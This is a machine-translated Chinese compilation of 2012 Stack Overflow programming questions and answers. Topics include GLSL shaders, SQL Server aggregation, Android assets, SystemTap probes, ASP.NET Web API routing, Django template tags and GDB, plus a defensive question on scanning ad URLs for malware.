2.  每次使用一个着色器程序，然后退出多个着色器程序。
3.  在渲染不同的 pass 时使用 glsl 中的子程序来选择不同的子程序。

我想知道什么时候应该使用第一种方法？2ed方法？等任何有经验的开发人员可以提供帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T13:23:04.640

许多问题无需多次通过即可解决。试着在没有它们的情况下创造一种技术。如果没有其他工作，请使用方法 3。

我对此的看法：

*   方法 1 非常缓慢且无法使用。
*   方法 2 的工作量很大，但如果做得好，它“很快”。
*   方法 3 简单而优雅，但有额外的处理开销。您可以多次渲染您的对象并将您当前的通行证编号传递给您的着色器。

方法 3 的示例：

```
uniform int currentPass;

/* OTHER UNIFORMS */

void main()
{
    if(currentPass == 1)
    {
         /* DO SOMETHING */
    }
    else if(currentPass == 2)
    {
         /* DO SOMETHING */
    }
    else if(...) { ... }
} 
```

在我看来，最好的方法是只使用很少的着色器（可能是一个材质着色器、一个后处理着色器等），所以你的方法 3 几乎是完美的。

有没有想过超级着色器？它们与您的方法“类似” 3\. Google it :) 我也推荐这个[问题](https://stackoverflow.com/questions/7235929/glsl-problem-multiple-shaders-in-one-program)。

[还要小心，if 语句可能会大大削弱您的性能。](http://www.heatonresearch.com/content/initial-impressions-gpu-programming)

# sql - JOIN 三个表并为单独列中的每个 DISTINCT 行聚合来自多行的数据

> ID：10597387
> 
> 赞同：0
> 
> 时间：2012-05-15T09:01:16.450
> 
> 标签：sql, sql-server, sql-server-2008, select, isqlquery

JOIN 三个表并为单独列中的每个 DISTINCT 行聚合来自多行的数据

我有一张表，其中一个项目与多个项目映射。

```
Key 1 | Key 2
1       2
1       5
1       6
1       4
1       8 
```

我有另一张这样的桌子

```
Key 1 | ShortKey1Desc
1       'Desc short' 
```

我还有一张桌子，上面有这样的数据

```
Key 1 | Description
1       'Desc a'
1       'Desc c'
1       'Desc aa'
1       'Desc tt' 
```

我需要为我的视图编写一个 sql 查询，其中将生成这样的表

```
Key 1 | AllKeys2ForKey1 | AllDescriptionsForKey1           | ShortKey1Desc
1     | 2;5;6;4;8       | Desc a; Desc c; Desc aa; Desc tt | Desc short 
```

键 1 是一个字符串类型字段，所以我需要使用该字符串键加入它们的表

我正在尝试创建一个舒适的数据访问视图。需要创建一个不需要很长时间的查询。我已经尝试过使用 Functions 来实现，但加载需要很长时间。

对此的任何帮助将不胜感激。多谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T11:19:32.290

假设您无法更改数据结构以进行更有效的查询，这将起作用：

```
--Populate sample data
SELECT 1 as key1,       2  as key2 INTO #tbl1
UNION ALL SELECT 1,       5 
UNION ALL SELECT 1,       6 
UNION ALL SELECT 1,       4 
UNION ALL SELECT 1,       8 

SELECT 1  as key1,     'Desc short' as shortkeydesc INTO #tbl2

SELECT 1   as key1,    'Desc a'  as [description] INTO #tbl3
UNION ALL SELECT 1,       'Desc c' 
UNION ALL SELECT 1,       'Desc aa' 
UNION ALL SELECT 1,       'Desc tt' 

--Combine data into semi-colon separated lists
SELECT 
key1
,STUFF(
    (
    SELECT
      ';' + CAST(t2.key2 AS VARCHAR(10))
    FROM #tbl1 t2
    WHERE t2.key1 = tbl1.key1
    FOR XML PATH('')
    ), 1, 1, ''
  )
,STUFF(
    (
    SELECT
      ';' + tbl2.shortkeydesc
    FROM #tbl2 tbl2
    WHERE tbl2.key1 = tbl1.key1
    FOR XML PATH('')
    ), 1, 1, ''
  )
,STUFF(
    (
    SELECT
      ';' + tbl3.[description]
    FROM #tbl3 tbl3
    WHERE tbl3.key1 = tbl1.key1
    FOR XML PATH('')
    ), 1, 1, ''
  )
FROM #tbl1 tbl1
GROUP BY tbl1.key1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:45:59.027

要将行转换为一个结果，您需要将值保存在变量中，下面是示例代码，只是为了给您一个想法

```
Declare @AllKeys2ForKey1 varchar(50)
set @AllKeys2ForKey1 = ''
SELECT @AllKeys2ForKey1 = @AllKeys2ForKey1  + cast([Key 2] as varchar(3)) + ','
  FROM [AllKeys2ForKey1Table] where [KEY 1] = 1

Declare @AllDescriptionsForKey1 varchar(100)
set @AllDescriptionsForKey1 = ''
SELECT @AllKeys2ForKey1 = @AllKeys2ForKey1  + [Description] + ','
  FROM [AllDescriptionsForKey1Table] where [KEY 1] = 1

Declare @ShortKey1Desc varchar(100)
set @ShortKey1Desc = ''
SELECT @ShortKey1Desc = @ShortKey1Desc  + [ShortKey1Desc] + ','
  FROM [ShortKey1DescTable] where [KEY 1] = 1  

Select [KEY 1], 
        substring(@AllKeys2ForKey1,1,len(@AllKeys2ForKey1) - 1) as 'AllKeys2ForKey1 ',
        substring(@AllDescriptionsForKey1,1,len(@AllDescriptionsForKey1) - 1) as 'AllDescriptionsForKey1',
        substring(@ShortKey1Desc,1,len(@ShortKey1Desc) - 1)  as 'ShortKey1Desc'
from Table where [KEY 1]= 1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T23:17:00.480

你必须编写 CLR 聚合函数来解决这个问题。用于编写 CLR 聚合函数： 1：运行 Microsoft Visual Stadio 2：创建新项目 3：然后选择数据项目 4：CLR 聚合函数

创建聚合函数后创建查询，如下所示

```
 Select A.Key1, OwnAggregateFn(B.Description), OwnAggregateFn(C.Key2), ...
 From A
 inner join B ON B.Key1 = A.Key1
 inner join C ON C.Key1 = A.Key1
 ... 
 Group By A.Key1 
```

# perl - 如何在网页上执行 .pm 文件

> ID：10597390
> 
> 赞同：0
> 
> 时间：2012-05-15T09:01:23.767
> 
> 标签：perl

我得到了两个需要跟踪的 .pm 文件...问题是我以前没有遇到过一个，而且我不知道如何在网页上运行它以进行跟踪。

我是否只需要在我的网络服务器上上传这些 .pm 文件，然后转到指向其位置的 url？

我一无所知。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:08:00.987

.pm 文件只是一个 Perl 模块。有很多接口可用于在 Web 服务器上运行 Perl 代码（包括 PSGI/Plack、FastCGI、mod_perl 和 CGI​​）。您如何使用这些模块的细节将取决于它们被设计成如何与服务器交互。您拥有的文件甚至可能不打算直接使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:09:21.527

根据您要实现的目标，您可能必须使用这些 pm 文件创建一个 perl 脚本。您不能使用网络浏览器直接访问它们，因为这些文件更像是库而不是您可以运行的脚本。

# c++ - 隐藏 qtablewidget 和颜色列中的行数

> ID：10597395
> 
> 赞同：1
> 
> 时间：2012-05-15T09:01:39.617
> 
> 标签：c++, qt, qtablewidget

在我的项目中，我遇到了隐藏行数的问题`QTableWidget`，我需要显示表格但没有行号和边框，这里是标准的`QTableWidget`。

![标准表](../Images/95638131a34ccec660f7d0a9bd0ad13f.png)

如何隐藏单元格的行数和边框并为列着色，有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T10:04:40.287

您应该更改 QTableWidget 的属性。如果您使用的是 qt-creator，只需右键单击表单（name.ui）中的表格小部件，然后单击编辑项目，然后取消选中行和列的可翻译属性。您可以通过更改其样式表来更改列的颜色。

# android - 从资产文件夹中检索图像路径

> ID：10597398
> 
> 赞同：1
> 
> 时间：2012-05-15T09:01:46.153
> 
> 标签：android, path, assets

我在从资产文件夹中检索图像路径时遇到问题。

我在资产文件夹中有一个图像文件夹。在文件夹中，我有三个不同的文件夹。

这是我使用的代码：

```
String IntroImage1= "" + languageSelected + "/" + Intro1ImagePath + ".png" ;

try{
    AssetManager mngr =getAssets();
    InputStream BulletImgInput = mngr.open(IntroImage1);
    //InputStream BulletImgInput = mngr.open("image/Malay/bullet.png");

    Bitmap bitmapBullet = BitmapFactory.decodeStream(BulletImgInput);
    BulletImage.setImageBitmap(bitmapBullet);
    }catch(final IOException e){
    e.printStackTrace();
    } 
```

我想知道为什么我不能显示图像？因为我试图通过这段代码来检索它：

```
InputStream BulletImgInput = mngr.open("image/Malay/bullet.png"); 
```

**它确实检索了文件，但是我在mngr.open**中替换的字符串没有显示出来。

真的需要你们帮忙。谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T09:14:30.937

您不需要 AssetManager。你可以做

`BitmapFactory.decodeFile("file:///android_asset/image/Malay/bullet.jpg")`

尽管将图像存储在资产中并不是最好的方法。您将无法利用 Android 资源管理系统。因此，除非您有令人信服的理由这样做，否则我建议您看看使用`res`文件夹和资源系统。

更新：说明`BitmapFactory`有一个方法来通过该方法解码文件`decodeFile`。这是第一点。Android 允许您`assets`通过`file:///android_asset/{path}`路径访问文件夹中的文件。在您的情况下，/image/Malay/bullet.jpg 中的图像是`assets`可以通过`file:///android_asset/image/Malay/bullet.jpg`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T09:26:44.503

尝试这个：

```
try {

    // get input stream
    InputStream ims = getAssets().open("avatar.jpg");

    // load image as Drawable
    Drawable d = Drawable.createFromStream(ims, null);

    // set image to ImageView
    mImage.setImageDrawable(d);
}
catch(IOException ex) {

      Log.e("I/O ERROR","Failed when ..."
} 
```

你的子弹图像

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-15T09:04:09.317

```
String url = "file:///android_asset/NewFile.txt";

String url = "file:///android_asset/logo.png"; 
```

您可以访问任何文件....

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T09:08:07.050

```
InputStream BulletImgInput = mngr.open("file:///android_asset/image/Malay/bullet.png"); 
```

也许这对你有用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-15T09:09:23.960

可能问题出在`image`路径的丢失部分？

```
String IntroImage1= "image/" + languageSelected + "/" + Intro1ImagePath + ".png" ; 
```

代替

```
String IntroImage1= "" + languageSelected + "/" + Intro1ImagePath + ".png" ; 
```

Upd：检查`languageSelected`and的值`Intro1ImagePath`。

# api - 基于 Selenium 的恶意软件（恶意广告）检查 - 几个问题

> ID：10597399
> 
> 赞同：5
> 
> 时间：2012-05-15T09:01:48.053
> 
> 标签：api, selenium, malware, safe-browsing

我们最近遇到了一个问题，即通过第三方购买广告的广告商通过他们购买的广告传播恶意软件。

这导致谷歌在短时间内将我们的网络资产列入黑名单。

此问题现已解决。

发生这种情况后，我们决定对我们的广告商进行自我调整。

在网上搜索提供此服务的服务后，我们发现了一些... Armorize (www.armorize.com) 等提供此类服务。但在与他们的销售人员电话交谈后，我们发现他们为这项服务收取大约 10K-15K 美元/年的费用。超出我们的价格范围。

我们没有那种蛋糕。

我们所拥有的是我们（错误，我的）肩膀上的聪明头脑。

所以，这就是我开发的。

```
A) Selenium running firefox.
B) Firefox proxying all requests via a locally hosted squid proxy. 
```

结果？

输入广告商 URL -> Selenium Firefox -> Squid 访问日志 -> 广告命中的所有 URL 的干净列表。

下一步是针对某种恶意软件列表对这些进行测试。我们现在正在针对谷歌的安全浏览 API ( [https://developers.google.com/safe-browsing/](https://developers.google.com/safe-browsing/) ) 测试它们。

结果正是我们想要的。一种通过“真实浏览器”测试我们的广告商点击的每个 URL 的方法。

**所以，问题如下：**

a）就谷歌而言，使用他们的（谷歌）API是否可以接受？我们将 100% 保留在内部，并且不会转售此服务。它对我们来说是 100%。

b) 谷歌安全浏览器 API 是否允许检查完整的 URL，还是仅在每个域的基础上工作？

c) 有谁知道我们可以测试这些 URL 的任何其他 API？免费/低成本会很棒:)

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-10T07:47:16.687

一种。查看[安全浏览 API 服务条款](https://developers.google.com/safe-browsing/terms)和[Google API 服务条款](https://developers.google.com/terms/)我找不到您所做的任何超出这些条款的内容。

湾。文档始终引用 URL 而不是域 - 执行了一些测试（例如，liderlab.ru / absa/ vs.liderlab.ru /absa / page/ 1）第一个是网络钓鱼站点并给出适当的警告，而第二个没有t)。

C。[PhishTank](http://www.phishtank.com/developer_info.php)很好而且免费，而且似乎比 Google 更新一些（通过简短的调查）。[BrightCloud](http://bcws.brightcloud.com/)是一种价格合理的服务付费。[URL 黑名单](http://urlblacklist.com/?sec=download)是一种在荣誉系统上运行的付费服务，因此您可以查看他们的数据。

# linux-kernel - 如何使用 stap -L 选项？

> ID：10597400
> 
> 赞同：2
> 
> 时间：2012-05-15T09:01:59.540
> 
> 标签：linux-kernel, ubuntu-11.10, systemtap

我正在关注 SystemTap 教程，我正在尝试执行第 2.3 节 - [“跟踪。练习”](http://sourceware.org/systemtap/tutorial/Tracing.html#SECTION00033000000000000000)中的练习 1 。该`-L`选项似乎永远不会起作用。我得到了这个脚本：

```
probe kernel.function("*nit*"){} 
```

我在终端中输入：

```
$ stap -L PROBE t.stp 
```

什么也没有发生。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-16T04:32:46.140

```
$ stap -L 'kernel.function("blahblah")' 
```

Systemtap 很棒，但文档很差。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-16T16:10:40.210

来自[`man stap`](https://sourceware.org/systemtap/man/stap.1.html)（`systemtap*-1.7-2.fc15.x86_64`安装了 RPM）

```
 stap [ OPTIONS ] -l PROBE [ ARGUMENTS ]
   stap [ OPTIONS ] -L PROBE [ ARGUMENTS ]

   -l PROBE
          Instead of running a probe script, just list all available probe
          points  matching  the given single probe point.  The pattern may
          include wildcards and aliases, but not comma-separated  multiple
          probe  points.  The process result code will indicate failure if
          there are no matches.

   -L PROBE
          Similar to "-l", but list probe points  and  script-level  local
          variables. 
```

“探测点”指的是 'kernel.function("blahblah")' 等。之前没有关键字“probe”，之后没有探测处理程序。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-06-08T18:24:32.733

```
stap -L kernel.function("*nit*") | sort 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-09-06T03:45:29.223

您可以尝试以下示例。

获取所有内核函数的列表。

$ stap -l 'kernel.function("*")' | 种类

kernel.function("vfs_read@/build/linux-lts-xenial-Hu9lgy/linux-lts-xenial-4.4.0/fs/read_write.c:440") [....]

获取内核函数和参数（局部变量）

$ stap -L 'kernel.function("*")' | grep vfs_read

kernel.function("vfs_read@/build/linux-lts-xenial-Hu9lgy/linux-lts-xenial-4.4.0/fs/read_write.c:440") $file:struct file* $buf:char* $count :size_t $pos:loff_t*

[……]

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-11-12T02:02:45.070

只是为了补充比我更有学识的人所说的：

```
stap -L 'module("module-name-here").function("*")' 
```

对于常规内核探测：

```
stap -L 'kernel.function("*")' 
```

希望这对将来的其他人有所帮助！

# javascript - 我的功能仅在我的 ajax 调用后与警报一起使用

> ID：10597402
> 
> 赞同：1
> 
> 时间：2012-05-15T09:02:14.937
> 
> 标签：javascript, ajax

我正在用我的数据库中的值填充一个表。我在可以删除的行中包含了一个删除图标。图像有一个`onclick='deleteCat(id);'`属性，id 是通过这样的循环从 json 数组中获取的：

`string = "<td align='center'><a href=''><img border='0' src='../images/Bullet-Delete.png' alt='delete' onclick='deleteCat("+json[i]['id']+");'/></a></td>";`

这是我的`deleteCat`功能：

```
function deleteCat(id){
    var dataString = "catId=" + id;
    $.ajax({
        type: "POST",  
        url: "../ajax/categorie_verwijderen.php",
        data: dataString,  
        success: function(data) {
                //$("#allecat").find("tr:gt(0)").remove();
                //update_table();                
        }
   });   
   //alert(id);
} 
```

当我在 ajax 之后发出警报时，我的功能起作用。表刷新，行从我的数据库中删除。但是，当我删除警报时，我的功能不起作用，表被刷新并且该行仍然存在于表和数据库中。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:06:11.950

您需要防止单击的默认事件 - 即每次单击图像时都会重新加载页面

```
function deleteCat(id){
    var dataString = "catId=" + id;
    $.ajax({
        type: "POST",  
        url: "../ajax/categorie_verwijderen.php",
        data: dataString,  
        success: function(data) {
                $("#allecat").find("tr:gt(0)").remove();
                update_table();                
        }
   });   
   return false; // prevent the browser following the href
} 
```

您还需要更改您的 html ：

```
onclick='return deleteCat("+json[i]['id']+"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-18T09:44:31.260

alert() 有帮助，因为这会延迟该函数中剩余 javascript 的处理。ajax 异步发送数据。async 键是默认值：true 并且应该在您的调用中将其更改为**false**，直到客户端等待 ajax 调用结束。例如：

```
$.ajax({
  async:false,
  url: "test.html",
  .
  .

}); 
```

# asp.net-mvc - ASP.NET MVC Web API 4 - 复杂的 URL 模板

> ID：10597408
> 
> 赞同：2
> 
> 时间：2012-05-15T09:02:32.763
> 
> 标签：asp.net-mvc, wcf, templates, url, asp.net-web-api

在 WCF REST 中，我可以定义一个严格的 URL 模板。

在 ASP.NET MVC Web API 4 中我遇到了问题。

我正常注册了路线：

```
 routes.MapHttpRoute(
                 name: "DefaultApi",
                 routeTemplate: "api/{controller}/{id}",
                 defaults: new { id = RouteParameter.Optional }
             ); 
```

我的控制器有这个方法：

```
// POST /api/documents
public HttpResponseMessage<Document> Post(Document document) 
{...} 
```

**如果我使用此 URL“http://servername.com:53835/api/Documents/1337”（参数“ 1337** ”不应该存在）发送 POST 请求，它会调用 Post(Document document) 方法。但我希望框架在这种情况下显示错误。（例如“未找到此请求的 API 调用”）。

使用 REST WCF，我可以严格配置它......我对这种“约定优于配置”并不那么热情......

以及如何做更复杂的 URL 模板？

*   我想要这样的东西：

带有此 URL 模板的 GET 请求的 API：“http://servername.com:53835/api/Documents/1337”以获取特定的文档对象（包含创建日期、创建者等元数据......） .

另一个 GET-Request 应该使用以下 URL 检索文件本身（作为流）： [http ://servername.com:53835/api/Documents/1337/File](http://servername.com:53835/api/Documents/1337/File)

我该如何定义这种差异？获取文档对象的 GET 方法如下所示：

```
// GET /api/documents/5
public HttpResponseMessage<Document> Get(int id)
{...} 
```

如何定义具有相同参数的单独方法（在本例中为“id”）？我是否必须使用 WCF REST-Projects 中的方法属性配置 URL 模板？

我可以像这样编辑 {action} 占位符的路由：

```
routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{mandant}/{controller}/{id}/{action}",
                defaults: new { mandant = "profile", id = RouteParameter.Optional, action = RouteParameter .Optional}
            ); 
```

然后我可以使用方法属性 [ActionName("File")] 和 [AcceptVerbs("GET")] 撒谎：

```
[ActionName("File")]
[AcceptVerbs("GET")]
public HttpResponseMessage FileDownload(int id) 
```

然后我可以调用：“http://servername.com:53835/api/Documents/1337/File”来获取文件。但是如果我想要更多这些“动作”呢？

*   更复杂的用例是包含重复部分的 URL。像：（在这种情况下，我有一些项目特征。这个特征的数量应该是可变的）

[http://servername.com:53835/api/Documents/characteristic_1/characteristic_2/characteristic_3](http://servername.com:53835/api/Documents/) [http://servername.com:53835/api/Documents/characteristic_1/characteristic_2](http://servername.com:53835/api/Documents/) **_** **_**

 **具有特征的部分应该是动态/可变的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T10:50:54.060

我也玩过这个，我发现这种方法在很多情况下可能会导致不希望的结果，并且会以某种方式使您的 API 难以使用。最适合我的是我的 API 方法只有一个输入参数，即 ID，并使用 URL 参数传递所有其他变量。

为了避免干燥的东西，您可以考虑编写一个 ActionFilter 左右。**

# django-forms - 在表单字段的呈现中一致（取消）标签的大写

> ID：10597411
> 
> 赞同：0
> 
> 时间：2012-05-15T09:02:41.893
> 
> 标签：django-forms

我的图形设计要求 HTML 表单中的所有字段都是小写的。例子：

```
<tr><th><label for="id_pressure_Hg">pressure Hg</label></th><td><input 
id="id_pressure_Hg" type="text" name="pressure_Hg" /></td></tr> 
```

但是，默认情况下，Django 表单将我的标签设为首字母大写。由于我有很多字段并且许多表单是从模型（通过模型表单）创建的，因此“标签”属性不是一个可行的解决方案。

有没有办法修改将字段名称转换为字段标签的功能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:20:59.533

你可以试试这个。

例子..

在你的 forms.py

```
value = forms.CharField(label=u'', widget=forms.TextInput()) 
```

在您的 HTML 文件中。

```
<ul>
    <li>value Value : {{form.value}}</li>
</ul> 
```

您可以`form.value`在 CSS 或 JQuery 中修改。我将此属性作为html中的输入..`id=id_value`和`name=value`

# android - 在 Android 中使用我的应用拨打电话

> ID：10597420
> 
> 赞同：0
> 
> 时间：2012-05-15T09:03:25.203
> 
> 标签：android

假设您已经在手机中安装了 Viber 或 skype。当您打电话时（只是从您的手机接听普通电话），您拨打号码并按下拨号按钮将弹出一个选择弹出窗口，列出 viber 和 skype。这意味着您的呼叫可以重定向到那个。

我需要做同样的事情。我需要拦截那个电话

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T10:20:26.063

我觉得你想要这种类型的输出： ![在此处输入图像描述](../Images/802244b1e8c34a4d84317b493011fefe.png)

意味着在您的应用程序中，您单击呼叫某人的按钮，它会显示这种类型的应用程序弹出窗口，可以用作拨号器。

![在此处输入图像描述](../Images/e7c67c476707ce00328c25510177ec6b.png)

![在此处输入图像描述](../Images/704535d79026f19d64ed5e599af6d604.png)

# javascript - 函数的自定义原型链

> ID：10597421
> 
> 赞同：3
> 
> 时间：2012-05-15T09:03:25.237
> 
> 标签：javascript, prototype, ecmascript-5

我只是好奇我是否可以将一个对象包含到函数原型链中。我的意思是说：

```
var test = function() { return 'a'; };

console.log(test.bind(this)); // return new bound function

// changing the prototype
// in console the prototype is really set as needed
// test => new object => function prototype => Object prototype
var F = function() {};
F.prototype = Function.prototype;
test.prototype = new F();

console.log(test.bind()); // this still works and returns new bound function

test.prototype.bind = function() {
    return 'test';
};

console.log(test.bind()); // this does not work as expected -> returns new bound function instead of 'test'. When I do delete Function.prototype.bind, then console.log(test.bind) returns undefined 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T11:21:27.923

你有一个函数`test`。它是一个`instanceof Function`, 并且继承自`Function.prototype`以便您可以调用`test.bind`例如。

然后将函数的“原型”属性设置为继承自`Function.prototype`. 这意味着 的所有实例都`test`将继承自该对象（以及 Function.prototype）：

```
var t = new test;
t instanceof test; // => true
t instanceof Function; // => true 
```

然后覆盖自定义原型对象上的测试属性。这样做很好，因为 Function 方法只能在函数（即可调用对象）上调用：

```
>>> Function.prototype.bind.call({})
Unhandled Error: Function.prototype.bind: this object not callable 
```

在您与您的测试中，`console.log`仅在您的函数上应用 Function 方法`test`，而不是在它的实例上。很好，因为他们会失败。所以，我看不出任何对象应该继承自的理由`Function`——你不能构造不直接继承自`Function`.

# c++ - gthread.h 数组大小为负

> ID：10597422
> 
> 赞同：3
> 
> 时间：2012-05-15T09:03:32.923
> 
> 标签：c++, qt, qt-creator, gstreamer

我的 .pro 文件中有以下配置

```
INCLUDEPATH += /home/vickey/ossbuild-read-only/Shared/Build/Linux/x86/include/glib-2.0/
CONFIG += link_pkgconfig
PKGCONFIG += gstreamer-0.10
LIBS            += -L/usr/lib `pkg-config --cflags --libs gstreamer-0.10`
LIBS        += -L. -L/usr/lib -lphonon -lcurl -ltag -fopenmp -lsayonara_gstreamer 
```

当我尝试构建项目时，出现以下错误

```
/home/vickey/src/player/../../../../ossbuild-read-only/Shared/Build/Linux/x86/include/glib-2.0/glib/gthread.h:-1: In function 'gboolean g_once_init_enter(volatile gsize*)':

/home/vickey/src/player/../../../../ossbuild-read-only/Shared/Build/Linux/x86/include/glib-2.0/glib/gthread.h:348: error: size of array is negative 
```

双击错误将我带到 gthread.h 文件，并指出以下行

```
g_once_init_enter (volatile gsize *value_location)
{
  if G_LIKELY ((gpointer) g_atomic_pointer_get (value_location) != NULL)
    return FALSE;
  else
    return g_once_init_enter_impl (value_location);
} 
```

似乎是什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-03-21T07:01:43.440

为 64 位平台编译古老的 glib 和 pango 时出现相同的错误。

以下是`g_atomic_pointer_get`该版本中源代码的外观：

```
# define g_atomic_pointer_get(atomic) \
 ((void) sizeof (gchar [sizeof (*(atomic)) == sizeof (gpointer) ? 1 : -1]), \
  (g_atomic_pointer_get) ((volatile gpointer G_GNUC_MAY_ALIAS *) (volatile void *) (atomic))) 
```

所以，这里`atomic`是`gsize`，它必须与 相同`sizeof`，`gpointer`即`void*`。

它帮助我重新定义`gsize`并`gssize`在`glibconfig.h`.

也更新`GLIB_SIZEOF_VOID_P`,`GLIB_SIZEOF_LONG`和`GLIB_SIZEOF_SIZE_T`.

# django - 如何在 Django 中获取自定义模板标签的可选参数？

> ID：10597423
> 
> 赞同：3
> 
> 时间：2012-05-15T09:03:33.697
> 
> 标签：django, templates, django-1.4

我刚刚创建了一个自定义模板标签。

```
from django import template
from lea.models import Picture, SizeCache
register = template.Library()

@register.simple_tag
def rpic(picture, width, height, crop=False):
    return SizeCache.objects.get_or_create(width=width, height=height, picture=picture, crop=crop)[0].image_field.url 
```

除了可选参数crop之外，这都有效。可选参数可以设置，但被函数忽略并始终设置为 False。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T12:37:34.177

`simple_tag`像 Python 调用一样工作。

如果您`True`在模板中传递文字，它将被视为命名变量`True`并在模板上下文中进行搜索。如果没有`True`定义，只要`''`字段是.`False``crop``models.BooleanField`

例如，

*在 foo/templatetags/foo.py*

```
from django import template
register = template.Library()

def test(x, y=False, **kwargs):
    return unicode(locals()) 
```

*在壳里*

```
>>> from django.template import Template, Context
>>> t = Template("{% load foo %}{% test 1 True z=42 %}")
>>> print t.render(Context())
{'y': '', 'x': 1, 'kwargs': {'z': 42}}

# you could define True in context
>>> print t.render(Context({'True':True}))
{'y': True, 'x': 1, 'kwargs': {'z': 42}}

# Also you could use other value such as 1 or 'True' which could be coerced to True
>>> t = Template("{% load foo %}{% test 1 1 z=42 %}")
>>> print t.render(Context())
{'y': 1, 'x': 1, 'kwargs': {'z': 42}}
>>> t = Template("{% load foo %}{% test 1 'True' z=42 %}")
>>> print t.render(Context())
{'y': 'True', 'x': 1, 'kwargs': {'z': 42}} 
```

# c - GDB：如何识别gdb中当前函数的特定变量的变量声明的行号

> ID：10597424
> 
> 赞同：7
> 
> 时间：2012-05-15T09:03:35.080
> 
> 标签：c, gdb

如何识别 gdb 中当前函数的特定变量的变量声明的行号？

这是一个示例代码：

```
1       #include<stdio.h>
2
3       void func(int*);
4
5       void main()
6       {
7       int x;
8       char c[5];
9       int* p;
10      char *g;
11      char *ptr;
12
13      p = &x;
14      g = &c[3];
15      func(&x);
16      ptr = &c[1];
17      c[1]='f';
18      x=12;
19
20      }
21
22      void func(int *l){
23      int x;
24      unsigned int ggg;
25      ggg =100;
26
27      x = 3;
28      *l = x;
29      }
30 
```

```
Wanted output:
for main()
  variable x, line 7
  variable c, line 8
  variable p, line 9
  variable g, line 10
  variable ptr, line 11

for func()
  variable x, line 23
  variable ggg, line 24 
```

假设我目前在 main() 函数中。我可以使用“”获取局部变量，`info locals`然后解析其变量名。

```
(gdb) info locals
x = 4200592
c = "\000ε\030@"
p = 0x7ffd4000
g = 0x40 <Address 0x40 out of bounds>
ptr = 0x13cf304 <Address 0x13cf304 out of bounds> 
```

并且使用 list 命令我能够获得变量的当前范围，但不是整个函数体。下面是 list 命令的结果，声明变量 ' `x`' 似乎丢失了。我还尝试将列表大小设置为 20，并得到从 8 到 27 的行，但仍然没有帮助。

```
(gdb) l
8       char c[5];
9       int* p;
10      char *g;
11      char *ptr;
12
13      p = &x;
14      g = &c[3];
15      func(&x);
16      ptr = &c[1];
17      c[1]='f'; 
```

如果我检查源代码中的所有代码行，我可能会遇到来自不同函数的相同变量声明...帮助

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-17T19:42:10.383

这很简单。您可以使用 list 命令查找相应的行。

```
(gdb) set listsize 1
(gdb) list x
7            int x;
(gdb) 
```

这将表明 x 在第 7 行；

或者使用快捷命令**l**作为命令**列表**

```
(gdb) l x
7            int x; 
```

# java - 使用Java从浏览器获取文件路径

> ID：10597436
> 
> 赞同：-1
> 
> 时间：2012-05-15T09:03:59.380
> 
> 标签：java, jsp, firefox, google-chrome

我有 jsp 代码和 servlet 我在 jsp 中编写代码以浏览本地机器的文件（用户文件）

```
 <input name="f" type="file" style=" -moz-background-size: 50" size="50" maxlength="30" > 
```

当我在 servlet 页面中获取文件路径时

```
f=  new String(request.getParameter("f").getBytes("iso-8859-1"), "UTF-8"); 
```

使用 Firefox 和 Chrome，由于安全性，我无法获得路径。我可以更改浏览器的安全设置以获取路径吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T20:39:03.943

也许浏览器有理由不让您访问文件的路径名以防止**信息泄漏**。

对此有相当多的担忧，这就是为什么要采取这种安全措施的原因。如果您可以禁用它，他们可能会完全跳过它。如果可以的话，那将是浏览器中的错误...

# paypal - PayPal沙箱：资金不足测试用例

> ID：10597437
> 
> 赞同：1
> 
> 时间：2012-05-15T09:04:01.650
> 
> 标签：paypal, paypal-sandbox

我正在尝试测试 PayPal 付款。我创建了 PayPal 测试账户，其中一个只有 1 美元。

但是当我试图用这个用户买东西时 - 付款成功。当客户资金不足时如何测试案例？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T06:36:11.857

根据我的经验，在沙盒中你不能。我有同样的问题，找不到解决方案。如果您使用 IPN，paypals 沙箱上有一个 IPN 生成器，您可以在其中生成 IPN 消息。但这并不涵盖所有场景（例如，您无法生成任何与定期付款相关的 IPN）。据我所知（如果我错了，请告诉我）这是你能得到的最好的。

# ms-access - 如何从 Excel 2003 VBA 在 Access 2002 中使用参数运行“生成表”查询

> ID：10597443
> 
> 赞同：1
> 
> 时间：2012-05-15T09:04:36.573
> 
> 标签：ms-access, excel-2003

我环顾四周，发现我认为可能是解决方案，但这不起作用:-(

我从来没有用过这种方法，真的不知道我哪里出错了，也许我需要用另一种方法？无论哪种方式，SQL 在 Access 中都可以正常工作。有人可以看看它并指出我正确的方向吗？感谢您的时间和考虑。

缺口

```
